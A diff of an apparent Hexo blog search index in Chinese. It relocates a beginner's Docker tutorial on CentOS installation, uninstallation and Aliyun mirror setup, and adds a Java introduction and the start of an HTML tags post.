@@ -119,6 +119,116 @@
       </tags>
   </entry>
   <entry>
+    <title>docker</title>
+    <url>/2023/07/30/Docker/</url>
+    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><span id="more"></span>
+
+<h1 id="Docker概述"><a href="#Docker概述" class="headerlink" title="Docker概述"></a>Docker概述</h1><p>Docker是一个开源平台，通过将应用程序隔离到轻量级、可移植的容器中，自动化应用程序的部署、扩展和管理。容器是独立的可执行单元，封装了运行应用程序所需的所有必要依赖项、库和配置文件，可以在各种环境中稳定地运行。</p>
+<p>Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 Linux或Windows操作系统的机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口</p>
+<p>隔离：docker核心思想！</p>
+<p>docker的思想来源于集装箱</p>
+<p>docker  十分轻巧！！！</p>
+<p>基于Go语言开发的，开源项目！</p>
+<p>虚拟机也是属于虚拟化技术，Docker 容器技术，也是一种 虚拟化技术!</p>
+<ul>
+<li>Vm:     linux centos原生镜像 (一个电脑!) 隔离，需要开启多个虚拟机!                        几个G                      几分钟</li>
+<li>docker:隔离,境像(最核心的环境 4m + jdk + mysql)十分的小巧， 运行像就可以了! 小巧! 几个M KB秒级启动!</li>
+</ul>
+<p><strong>虚拟机技术缺点:</strong><br>1、资源占用十分多<br>2、冗余步骤多<br>3、启动很慢 !<br><strong>容器化技术</strong><br><strong><code>容器化技术不是模拟的一个完整的提作系统</code></strong></p>
+<p><strong>比较Docker 和 虚拟机技术的不同:</strong></p>
+<ul>
+<li>传统虚拟机，虚拟出一条硬件，运行一个完整的操作系统，然后在这个系统上安装和运行软件</li>
+<li>容器内的应用直接运行在 宿主机的内容，容器是没有自己的内核的，也没有虚拟我们的硬件，所以就轻便</li>
+<li>每个容器间是互相隔离，每个容器内都有一个属于自己的文件系统，互不影响。</li>
+</ul>
+<p>官网: <a href="https://www.docker.com/">https://www.docker.com/</a></p>
+<p>文档地址: <a href="https://docs.docker.com/">https://docs.docker.com/</a> (超级详细)</p>
+<p>仓库地址: <a href="https://hub.docker.com/">https://hub.docker.com/</a></p>
+<h2 id="容器和Docker"><a href="#容器和Docker" class="headerlink" title="容器和Docker"></a><strong>容器和Docker</strong></h2><p>Docker是一种简化创建、部署和管理容器的平台。它为开发人员和管理员提供了一组工具和API，用于管理容器化的应用程序。使用Docker，您可以将应用程序代码、库和依赖项构建和打包成一个容器映像，该映像可以在支持Docker的任何环境中分发和一致地运行。</p>
+<h2 id="容器的必要性"><a href="#容器的必要性" class="headerlink" title="容器的必要性"></a><strong>容器的必要性</strong></h2><p><strong>应用更快速的交付和部署</strong><br>传统:一堆帮助文档，安装程序<br>Docker: 打包镜像发布测试，一键运行<br><strong>更便捷的升级和扩缩容</strong><br>使用了Docker之后，我们部署应用就和搭积木一样!<br>项目打包为一个镜像，扩展 服务器A ! 服务器B</p>
+<p><strong>更简单的系统运维</strong><br>在容器化之后，我们的开发，测试环境都是高度一致的。</p>
+<p><strong>更高效的计算资源利用</strong></p>
+<p>Docker 是 内核级别的虚拟化，可以在一个物理机上可以运行很多的客器实例!服务器的性能可以被压榨到极致.</p>
+<h1 id="Docker-的基本组成"><a href="#Docker-的基本组成" class="headerlink" title="Docker 的基本组成"></a>Docker 的基本组成</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/be7adea748abd28eee7d4ec814b7a316.jpeg" alt="img"></p>
+<p><strong>镜像(image )</strong> :<br>docker镜像就好比是一个模板，可以通过这个模板来创建容器服务，tomcat镜像&#x3D;&#x3D;&#x3D;&gt; run &#x3D;&#x3D;&gt; tomcat01 容器(提供服务器)通过这个镜像可以创建多个容器( 最终服务运行或者项目运行就是在容器中的)。<br><strong>容器(container) :</strong><br>Docker利用容器技术，独立运行一个或者一个组应用，通过镜像来创建的</p>
+<p>启动，停止，删除，基本命令!</p>
+<p>目前就可以把这个容器理解为就是一个简易的linux系统</p>
+<p><strong>仓库(repository) :</strong><br>仓库就是存放镜像的地方!<br>仓库分为公有仓库和私有仓库!<br>Docker Hub(默认是国外的)   阿里云….都有容器服务器(配置镜像加速 !)</p>
+<h1 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h1><p><strong>环境准备</strong></p>
+<ol>
+<li>Linux基础</li>
+<li>CentOS 7或以上版本</li>
+<li>使用Xshell连接远程服务器进行操作</li>
+</ol>
+<p><strong>环境查看</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#系统内核是3.10以上</span><br><span class="line">用uname -r查看</span><br></pre></td></tr></table></figure>
+
+<p>系统版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@163 ~]# cat /etc/os-release</span><br><span class="line">NAME=&quot;CentOS Linux&quot;</span><br><span class="line">VERSION=&quot;8&quot;</span><br><span class="line">ID=&quot;centos&quot;</span><br><span class="line">ID_LIKE=&quot;rhel fedora&quot;</span><br><span class="line">VERSION_ID=&quot;8&quot;</span><br><span class="line">PLATFORM_ID=&quot;platform:el8&quot;</span><br><span class="line">PRETTY_NAME=&quot;CentOS Linux 8&quot;</span><br><span class="line">ANSI_COLOR=&quot;0;31&quot;</span><br><span class="line">CPE_NAME=&quot;cpe:/o:centos:centos:8&quot;</span><br><span class="line">HOME_URL=&quot;https://centos.org/&quot;</span><br><span class="line">BUG_REPORT_URL=&quot;https://bugs.centos.org/&quot;</span><br><span class="line">CENTOS_MANTISBT_PROJECT=&quot;CentOS-8&quot;</span><br><span class="line">CENTOS_MANTISBT_PROJECT_VERSION=&quot;8&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>安装</strong></p>
+<ol>
+<li><p><strong>卸载旧版本</strong></p>
+<pre><code>yum remove docker \
+            docker-client \
+            docker-client-latest \
+            docker-common \
+            docker-latest \
+            docker-latest-logrotate \
+            docker-logrotate \
+            docker-engine
+</code></pre>
+</li>
+<li><p><strong>需要的安装包</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y yum-utils</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>设置镜像的仓库</strong></p>
+<p>yum-config-manager –add-repo <a href="https://download.docker.com/linux/centos/docker-ce.repo">https://download.docker.com/linux/centos/docker-ce.repo</a> &#x2F;&#x2F;默认是国外的，非常慢</p>
+<p>yum-config-manager –add-repo <a href="http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo">http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</a> &#x2F;&#x2F;阿里云镜像</p>
+<p>##更新yum软件包索引  yum makecache fast</p>
+</li>
+<li><p><strong>安装docker相关的</strong></p>
+<p>yum install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</p>
+<p>ce 社区  ee企业</p>
+</li>
+<li><p><strong>启动Docker</strong></p>
+<p>systemctl start docker</p>
+</li>
+<li><p><strong>使用docker version查看是否安装成功</strong></p>
+<p>[root@163 ~]# docker version<br>Client: Docker Engine - Community<br> Version:           24.0.5<br> API version:       1.43<br> Go version:        go1.20.6<br> Git commit:        ced0996<br> Built:             Fri Jul 21 20:36:32 2023<br> OS&#x2F;Arch:           linux&#x2F;amd64<br> Context:           default</p>
+<p>Server: Docker Engine - Community<br> Engine:<br>  Version:          24.0.5<br>  API version:      1.43 (minimum version 1.12)<br>  Go version:       go1.20.6<br>  Git commit:       a61e2b4<br>  Built:            Fri Jul 21 20:35:32 2023<br>  OS&#x2F;Arch:          linux&#x2F;amd64<br>  Experimental:     false<br> containerd:<br>  Version:          1.6.21<br>  GitCommit:        3dce8eb055cbb6872793272b4f20ed16117344f8<br> runc:<br>  Version:          1.1.7<br>  GitCommit:        v1.1.7-0-g860f061<br> docker-init:<br>  Version:          0.19.0<br>  GitCommit:        de40ad0</p>
+</li>
+<li><p><strong>sudo docker run hello-world</strong></p>
+</li>
+<li><p><strong>查看一下下载的这个 hello-world镜像</strong></p>
+<p>docker images</p>
+</li>
+</ol>
+<p><strong>了解</strong></p>
+<p>docker卸载</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 卸载依赖</span><br><span class="line"></span><br><span class="line">  ```yum remove docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin docker-ce-rootless-extras```</span><br><span class="line"></span><br><span class="line">2. 删除资源</span><br><span class="line">sudo rm -rf /var/lib/docker   //docker默认工作路径</span><br><span class="line">sudo rm -rf /var/lib/containerd</span><br></pre></td></tr></table></figure>
+
+<h1 id="阿里云镜像加速"><a href="#阿里云镜像加速" class="headerlink" title="阿里云镜像加速"></a>阿里云镜像加速</h1><ol>
+<li>登录阿里云找到容器镜像服务</li>
+</ol>
+<p><img src="https://img-blog.csdnimg.cn/14c9919761fe4833b59b16f1944f39fc.png" alt="请添加图片描述"></p>
+<ol start="2">
+<li><p>找到镜像加速器</p>
+</li>
+<li><p>配置使用</p>
+</li>
+</ol>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker </span><br><span class="line"></span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27; </span><br><span class="line">&#123; </span><br><span class="line"> &quot;registry-mirrors&quot;: [&quot;https://kzsz87k0.mirror.aliyuncs.com&quot;] </span><br><span class="line">&#125; </span><br><span class="line">EOF </span><br><span class="line"></span><br><span class="line">sudo systemctl daemon-reload </span><br><span class="line"></span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
+
+<h1 id="底层原理"><a href="#底层原理" class="headerlink" title="底层原理"></a>底层原理</h1><p><strong>Docker是什么工作的?</strong><br>Docker 是一个Client-Server 结构的系统，Docker的守护进程运行在主机上。通过Socket从客户端访问<br>DockerServer 接收到 Docker-Client 的指令，就会执行这个命令</p>
+<p><strong>Docker为什么比VM快</strong><br>1、Docker有着比虚拟机更少的抽象层<br>2、docker 利用的是宿主机的内核，vm 需要是 Guest OS。<br><img src="https://img-blog.csdnimg.cn/9b835a379a044e06869c036190e649aa.png" alt="在这里插入图片描述"><br>所以说，新建一个容器的时候，docker不需要想虚拟机一样重新加载一个操作系统内核，避免引导。虚拟机是加载 Guest OS，分钟级别的，而docker 是利用 宿主机的操作系统吗，省略了这个复杂的过程，秒级!</p>
+<p><img src="https://img-blog.csdnimg.cn/2725bac4251243ce9e42eff23e2e44ac.png" alt="在这里插入图片描述"></p>
+]]></content>
+      <tags>
+        <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Docke精髓</title>
     <url>/2023/08/01/Docke3/</url>
     <content><![CDATA[<h1 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h1><span id="more"></span>
@@ -261,116 +371,6 @@
       </tags>
   </entry>
   <entry>
-    <title>docker</title>
-    <url>/2023/07/30/Docker/</url>
-    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><span id="more"></span>
-
-<h1 id="Docker概述"><a href="#Docker概述" class="headerlink" title="Docker概述"></a>Docker概述</h1><p>Docker是一个开源平台，通过将应用程序隔离到轻量级、可移植的容器中，自动化应用程序的部署、扩展和管理。容器是独立的可执行单元，封装了运行应用程序所需的所有必要依赖项、库和配置文件，可以在各种环境中稳定地运行。</p>
-<p>Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 Linux或Windows操作系统的机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口</p>
-<p>隔离：docker核心思想！</p>
-<p>docker的思想来源于集装箱</p>
-<p>docker  十分轻巧！！！</p>
-<p>基于Go语言开发的，开源项目！</p>
-<p>虚拟机也是属于虚拟化技术，Docker 容器技术，也是一种 虚拟化技术!</p>
-<ul>
-<li>Vm:     linux centos原生镜像 (一个电脑!) 隔离，需要开启多个虚拟机!                        几个G                      几分钟</li>
-<li>docker:隔离,境像(最核心的环境 4m + jdk + mysql)十分的小巧， 运行像就可以了! 小巧! 几个M KB秒级启动!</li>
-</ul>
-<p><strong>虚拟机技术缺点:</strong><br>1、资源占用十分多<br>2、冗余步骤多<br>3、启动很慢 !<br><strong>容器化技术</strong><br><strong><code>容器化技术不是模拟的一个完整的提作系统</code></strong></p>
-<p><strong>比较Docker 和 虚拟机技术的不同:</strong></p>
-<ul>
-<li>传统虚拟机，虚拟出一条硬件，运行一个完整的操作系统，然后在这个系统上安装和运行软件</li>
-<li>容器内的应用直接运行在 宿主机的内容，容器是没有自己的内核的，也没有虚拟我们的硬件，所以就轻便</li>
-<li>每个容器间是互相隔离，每个容器内都有一个属于自己的文件系统，互不影响。</li>
-</ul>
-<p>官网: <a href="https://www.docker.com/">https://www.docker.com/</a></p>
-<p>文档地址: <a href="https://docs.docker.com/">https://docs.docker.com/</a> (超级详细)</p>
-<p>仓库地址: <a href="https://hub.docker.com/">https://hub.docker.com/</a></p>
-<h2 id="容器和Docker"><a href="#容器和Docker" class="headerlink" title="容器和Docker"></a><strong>容器和Docker</strong></h2><p>Docker是一种简化创建、部署和管理容器的平台。它为开发人员和管理员提供了一组工具和API，用于管理容器化的应用程序。使用Docker，您可以将应用程序代码、库和依赖项构建和打包成一个容器映像，该映像可以在支持Docker的任何环境中分发和一致地运行。</p>
-<h2 id="容器的必要性"><a href="#容器的必要性" class="headerlink" title="容器的必要性"></a><strong>容器的必要性</strong></h2><p><strong>应用更快速的交付和部署</strong><br>传统:一堆帮助文档，安装程序<br>Docker: 打包镜像发布测试，一键运行<br><strong>更便捷的升级和扩缩容</strong><br>使用了Docker之后，我们部署应用就和搭积木一样!<br>项目打包为一个镜像，扩展 服务器A ! 服务器B</p>
-<p><strong>更简单的系统运维</strong><br>在容器化之后，我们的开发，测试环境都是高度一致的。</p>
-<p><strong>更高效的计算资源利用</strong></p>
-<p>Docker 是 内核级别的虚拟化，可以在一个物理机上可以运行很多的客器实例!服务器的性能可以被压榨到极致.</p>
-<h1 id="Docker-的基本组成"><a href="#Docker-的基本组成" class="headerlink" title="Docker 的基本组成"></a>Docker 的基本组成</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/be7adea748abd28eee7d4ec814b7a316.jpeg" alt="img"></p>
-<p><strong>镜像(image )</strong> :<br>docker镜像就好比是一个模板，可以通过这个模板来创建容器服务，tomcat镜像&#x3D;&#x3D;&#x3D;&gt; run &#x3D;&#x3D;&gt; tomcat01 容器(提供服务器)通过这个镜像可以创建多个容器( 最终服务运行或者项目运行就是在容器中的)。<br><strong>容器(container) :</strong><br>Docker利用容器技术，独立运行一个或者一个组应用，通过镜像来创建的</p>
-<p>启动，停止，删除，基本命令!</p>
-<p>目前就可以把这个容器理解为就是一个简易的linux系统</p>
-<p><strong>仓库(repository) :</strong><br>仓库就是存放镜像的地方!<br>仓库分为公有仓库和私有仓库!<br>Docker Hub(默认是国外的)   阿里云….都有容器服务器(配置镜像加速 !)</p>
-<h1 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h1><p><strong>环境准备</strong></p>
-<ol>
-<li>Linux基础</li>
-<li>CentOS 7或以上版本</li>
-<li>使用Xshell连接远程服务器进行操作</li>
-</ol>
-<p><strong>环境查看</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#系统内核是3.10以上</span><br><span class="line">用uname -r查看</span><br></pre></td></tr></table></figure>
-
-<p>系统版本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@163 ~]# cat /etc/os-release</span><br><span class="line">NAME=&quot;CentOS Linux&quot;</span><br><span class="line">VERSION=&quot;8&quot;</span><br><span class="line">ID=&quot;centos&quot;</span><br><span class="line">ID_LIKE=&quot;rhel fedora&quot;</span><br><span class="line">VERSION_ID=&quot;8&quot;</span><br><span class="line">PLATFORM_ID=&quot;platform:el8&quot;</span><br><span class="line">PRETTY_NAME=&quot;CentOS Linux 8&quot;</span><br><span class="line">ANSI_COLOR=&quot;0;31&quot;</span><br><span class="line">CPE_NAME=&quot;cpe:/o:centos:centos:8&quot;</span><br><span class="line">HOME_URL=&quot;https://centos.org/&quot;</span><br><span class="line">BUG_REPORT_URL=&quot;https://bugs.centos.org/&quot;</span><br><span class="line">CENTOS_MANTISBT_PROJECT=&quot;CentOS-8&quot;</span><br><span class="line">CENTOS_MANTISBT_PROJECT_VERSION=&quot;8&quot;</span><br></pre></td></tr></table></figure>
-
-<p><strong>安装</strong></p>
-<ol>
-<li><p><strong>卸载旧版本</strong></p>
-<pre><code>yum remove docker \
-            docker-client \
-            docker-client-latest \
-            docker-common \
-            docker-latest \
-            docker-latest-logrotate \
-            docker-logrotate \
-            docker-engine
-</code></pre>
-</li>
-<li><p><strong>需要的安装包</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y yum-utils</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>设置镜像的仓库</strong></p>
-<p>yum-config-manager –add-repo <a href="https://download.docker.com/linux/centos/docker-ce.repo">https://download.docker.com/linux/centos/docker-ce.repo</a> &#x2F;&#x2F;默认是国外的，非常慢</p>
-<p>yum-config-manager –add-repo <a href="http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo">http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</a> &#x2F;&#x2F;阿里云镜像</p>
-<p>##更新yum软件包索引  yum makecache fast</p>
-</li>
-<li><p><strong>安装docker相关的</strong></p>
-<p>yum install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</p>
-<p>ce 社区  ee企业</p>
-</li>
-<li><p><strong>启动Docker</strong></p>
-<p>systemctl start docker</p>
-</li>
-<li><p><strong>使用docker version查看是否安装成功</strong></p>
-<p>[root@163 ~]# docker version<br>Client: Docker Engine - Community<br> Version:           24.0.5<br> API version:       1.43<br> Go version:        go1.20.6<br> Git commit:        ced0996<br> Built:             Fri Jul 21 20:36:32 2023<br> OS&#x2F;Arch:           linux&#x2F;amd64<br> Context:           default</p>
-<p>Server: Docker Engine - Community<br> Engine:<br>  Version:          24.0.5<br>  API version:      1.43 (minimum version 1.12)<br>  Go version:       go1.20.6<br>  Git commit:       a61e2b4<br>  Built:            Fri Jul 21 20:35:32 2023<br>  OS&#x2F;Arch:          linux&#x2F;amd64<br>  Experimental:     false<br> containerd:<br>  Version:          1.6.21<br>  GitCommit:        3dce8eb055cbb6872793272b4f20ed16117344f8<br> runc:<br>  Version:          1.1.7<br>  GitCommit:        v1.1.7-0-g860f061<br> docker-init:<br>  Version:          0.19.0<br>  GitCommit:        de40ad0</p>
-</li>
-<li><p><strong>sudo docker run hello-world</strong></p>
-</li>
-<li><p><strong>查看一下下载的这个 hello-world镜像</strong></p>
-<p>docker images</p>
-</li>
-</ol>
-<p><strong>了解</strong></p>
-<p>docker卸载</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 卸载依赖</span><br><span class="line"></span><br><span class="line">  ```yum remove docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin docker-ce-rootless-extras```</span><br><span class="line"></span><br><span class="line">2. 删除资源</span><br><span class="line">sudo rm -rf /var/lib/docker   //docker默认工作路径</span><br><span class="line">sudo rm -rf /var/lib/containerd</span><br></pre></td></tr></table></figure>
-
-<h1 id="阿里云镜像加速"><a href="#阿里云镜像加速" class="headerlink" title="阿里云镜像加速"></a>阿里云镜像加速</h1><ol>
-<li>登录阿里云找到容器镜像服务</li>
-</ol>
-<p><img src="https://img-blog.csdnimg.cn/14c9919761fe4833b59b16f1944f39fc.png" alt="请添加图片描述"></p>
-<ol start="2">
-<li><p>找到镜像加速器</p>
-</li>
-<li><p>配置使用</p>
-</li>
-</ol>
- <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker </span><br><span class="line"></span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27; </span><br><span class="line">&#123; </span><br><span class="line"> &quot;registry-mirrors&quot;: [&quot;https://kzsz87k0.mirror.aliyuncs.com&quot;] </span><br><span class="line">&#125; </span><br><span class="line">EOF </span><br><span class="line"></span><br><span class="line">sudo systemctl daemon-reload </span><br><span class="line"></span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
-
-<h1 id="底层原理"><a href="#底层原理" class="headerlink" title="底层原理"></a>底层原理</h1><p><strong>Docker是什么工作的?</strong><br>Docker 是一个Client-Server 结构的系统，Docker的守护进程运行在主机上。通过Socket从客户端访问<br>DockerServer 接收到 Docker-Client 的指令，就会执行这个命令</p>
-<p><strong>Docker为什么比VM快</strong><br>1、Docker有着比虚拟机更少的抽象层<br>2、docker 利用的是宿主机的内核，vm 需要是 Guest OS。<br><img src="https://img-blog.csdnimg.cn/9b835a379a044e06869c036190e649aa.png" alt="在这里插入图片描述"><br>所以说，新建一个容器的时候，docker不需要想虚拟机一样重新加载一个操作系统内核，避免引导。虚拟机是加载 Guest OS，分钟级别的，而docker 是利用 宿主机的操作系统吗，省略了这个复杂的过程，秒级!</p>
-<p><img src="https://img-blog.csdnimg.cn/2725bac4251243ce9e42eff23e2e44ac.png" alt="在这里插入图片描述"></p>
-]]></content>
-      <tags>
-        <tag>Docker</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Docker相关部署</title>
     <url>/2023/07/31/Docker2/</url>
     <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><span id="more"></span>
@@ -393,6 +393,126 @@
 ]]></content>
       <tags>
         <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java简介</title>
+    <url>/2023/07/26/Java1/</url>
+    <content><![CDATA[<h2 id="什么是Java"><a href="#什么是Java" class="headerlink" title="什么是Java"></a>什么是Java</h2><span id="more"></span>
+
+<p>Java是一门面向对象编程语言，不仅吸收了C++语言的各种优点，还摒弃了C++里难以理解的多继承、指针等概念，因此Java语言具有功能强大和简单易用两个特征。Java语言作为静态面向对象编程语言的代表，极好地实现了面向对象理论，允许程序员以优雅的思维方式进行复杂的编程 。</p>
+<h2 id="诞生背景"><a href="#诞生背景" class="headerlink" title="诞生背景"></a>诞生背景</h2><p>任职于Sun公司(Stanford University Network斯坦福网络公司)的詹姆斯·高斯林和麦克·舍林丹等人于1990年代初开发Java语言的雏形，最初被命名为Oak，Oak的目标是作为家用电器等小型系统的编程语言，用于电视机、电话、闹钟、烤面包机等家用电器的控制和通信。由于这些智能化家电的市场需求没有预期的高，Sun公司放弃了该项计划。随着1990年代互联网的发展，Sun公司发现Oak在互联网上应用的前景，于是改造了Oak，于1995年5月以Java的名称正式发布。伴随着互联网的迅猛发展，Java逐渐成为重要的网络编程语言。</p>
+<h2 id="语言特点与应用场景"><a href="#语言特点与应用场景" class="headerlink" title="语言特点与应用场景"></a>语言特点与应用场景</h2><p>Java语言具有简单性、面向对象、分布式、健壮性、安全性、跨平台性、可移植性、多线程与动态性等特点。Java语言可以编写桌面应用程序、Web应用程序、分布式系统和嵌入式系统等 。Java 快速、安全、可靠。从笔记本电脑到数据中心，从游戏控制台到超级计算机，从手机到互联网，Java 无处不在！</p>
+<h2 id="JVM、JRE和JDK的关系"><a href="#JVM、JRE和JDK的关系" class="headerlink" title="JVM、JRE和JDK的关系"></a>JVM、JRE和JDK的关系</h2><h4 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h4><p>Java Virtual Machine是Java虚拟机，Java程序需要运行在虚拟机上，不同的平台有自己的虚拟机，因此Java语言可以实现跨平台。</p>
+<h4 id="JRE"><a href="#JRE" class="headerlink" title="JRE"></a>JRE</h4><p>Java Runtime Environment包括Java虚拟机和Java程序所需的核心类库等。核心类库主要是java.lang包：包含了运行Java程序必不可少的系统类，如基本数据类型、基本数学函数、字符串处理、线程、异常处理类等，系统缺省加载这个包</p>
+<p>如果想要运行一个开发好的Java程序，计算机中只需要安装JRE即可。</p>
+<h4 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h4><p>Java Development Kit是提供给Java开发人员使用的，其中包含了Java的开发工具，也包括了JRE。所以安装了JDK，就无需再单独安装JRE了。其中的开发工具：编译工具(javac.exe)，打包工具(jar.exe)等</p>
+<p>JVM&amp;JRE&amp;JDK关系图</p>
+<p><img src="https://img-blog.csdnimg.cn/20210430091557268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lhbmcxMzU2Mzc1ODEyOA==,size_16,color_FFFFFF,t_70" alt="img"></p>
+<h1 id="Java是编译型还是解释型语言"><a href="#Java是编译型还是解释型语言" class="headerlink" title="Java是编译型还是解释型语言"></a>Java是编译型还是解释型语言</h1><h3 id="1-编译型语言和解释型语言"><a href="#1-编译型语言和解释型语言" class="headerlink" title="1.编译型语言和解释型语言"></a>1.编译型语言和解释型语言</h3><h5 id="编译型语言"><a href="#编译型语言" class="headerlink" title="编译型语言"></a>编译型语言</h5><p><strong>定义</strong>：在程序运行之前，通过编译器将源程序编译成机器码(可运行的二进制代码)，以后执行这个程序时，就不用再进行编译了。</p>
+<p><strong>优点</strong>：编译器一般会有预编译的过程对代码进行优化。因为编译只做一次，运行时不需要编译，所以编译型语言的程序执行效率高，可以脱离语言环境独立运行。</p>
+<p><strong>缺点</strong>：编译之后如果需要修改就需要整个模块重新编译。编译的时候根据对应的运行环境生成机器码，不同的操作系统之间移植就会有问题，需要根据运行的操作系统环境编译不同的可执行文件。</p>
+<p><strong>总结</strong>：执行速度快、效率高；依靠编译器、跨平台性差些。</p>
+<p><strong>代表语言</strong>：C、C++、Pascal、Object-C以及Swift。</p>
+<h6 id="解释型语言"><a href="#解释型语言" class="headerlink" title="解释型语言"></a>解释型语言</h6><p><strong>定义</strong>：解释型语言的源代码不是直接翻译成机器码，而是先翻译成中间代码，再由解释器对中间代码进行解释运行。在运行的时候才将源程序翻译成机器码，翻译一句，然后执行一句，直至结束。</p>
+<p>优点：有良好的平台兼容性，在任何环境中都可以运行，前提是安装了解释器（虚拟机）。灵活，修改代码的时候直接修改就可以，可以快速部署，不用停机维护。</p>
+<p><strong>缺点</strong>：每次运行的时候都要解释一遍，性能上不如编译型语言。</p>
+<p><strong>总结</strong>：执行速度慢、效率低；依靠解释器、跨平台性好。</p>
+<p><strong>代表语言</strong>：JavaScript、Python、Erlang、PHP、Perl、Ruby。</p>
+<h5 id="混合型语言"><a href="#混合型语言" class="headerlink" title="混合型语言"></a>混合型语言</h5><p><strong>定义</strong>：既然编译型和解释型各有缺点就会有人想到把两种类型整合起来，取其精华去其糟粕，就出现了半编译，半解释型语言。</p>
+<p>比如C#，C#在编译的时候不是直接编译成机器码而是中间码，.NET平台提供了中间语言运行库运行中间码，中间语言运行库类似于Java虚拟机。.NET在编译成IL代码后，保存在dll中，首次运行时由JIT在编译成机器码缓存在内存中，下次直接执行。严格来说混合型语言属于解释型语言，C#更接近编译型语言。</p>
+<p><strong>Java即是编译型的，也是解释型语言，总的来说Java更接近解释型语言。</strong></p>
+<p>可以说它是编译型的。因为所有的Java代码都是要编译的，.java不经过编译就什么用都没有。同时围绕JVM的效率问题，会涉及一些如JIT、AOT等优化技术，例如JIT技术，会将热点代码编译成机器码。而AOT技术，是在运行前，通过工具直接将字节码转换为机器码。</p>
+<p>可以说它是解释型的。因为Java代码编译后不能直接运行，它是解释运行在JVM上的，所以它是解释运行的。</p>
+<h3 id="2-动态类型语言和静态类型语言"><a href="#2-动态类型语言和静态类型语言" class="headerlink" title="2.动态类型语言和静态类型语言"></a>2.动态类型语言和静态类型语言</h3><h6 id="动态类型语言"><a href="#动态类型语言" class="headerlink" title="动态类型语言"></a>动态类型语言</h6><p>动态类型语言：在运行期间才去做数据类型检查的语言，说的是数据类型。动态类型语言的数据类型不是在编译阶段决定的，而是把类型绑定延后到了运行阶段。</p>
+<p>代表语言：Python、Ruby、Erlang、JavaScript、Swift、PHP、Perl。</p>
+<h6 id="静态类型语言"><a href="#静态类型语言" class="headerlink" title="静态类型语言"></a>静态类型语言</h6><p>静态类型语言的数据类型是在编译期间（或运行之前）确定的，编写代码的时候要明确确定变量的数据类型。</p>
+<p>代表语言：C、C++、C#、Java、Object-C。</p>
+<h3 id="3-动态语言和静态语言"><a href="#3-动态语言和静态语言" class="headerlink" title="3.动态语言和静态语言"></a>3.动态语言和静态语言</h3><h5 id="动态语言"><a href="#动态语言" class="headerlink" title="动态语言"></a>动态语言</h5><p>动态类型语言和动态语言是完全不同的两个概念。</p>
+<p>动态语言：说的是运行时改变结构，说的是代码结构。在运行时可以改变其结构的语言：例如新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。通俗点说就是在运行时代码可以根据某些条件改变自身结构。</p>
+<p>代表语言：Object-C、C#、JavaScript、PHP、Python、Erlang。</p>
+<h5 id="静态语言"><a href="#静态语言" class="headerlink" title="静态语言"></a>静态语言</h5><p>与动态语言相对应的，运行时结构不可变的语言就是静态语言。如Java、C、C++。</p>
+]]></content>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTML</title>
+    <url>/2023/08/08/HTML/</url>
+    <content><![CDATA[<h1 id="html基本元素标签"><a href="#html基本元素标签" class="headerlink" title="html基本元素标签"></a>html基本元素标签</h1><span id="more"></span>
+
+<ol>
+<li><p><code>&lt;html&gt;</code>：HTML网页的根标签，表示一个HTML文档的开始和结束</p>
+</li>
+<li><p><code>&lt;head&gt;</code>：HTML文档的头部，用于描述文档的元数据、样式等信息</p>
+</li>
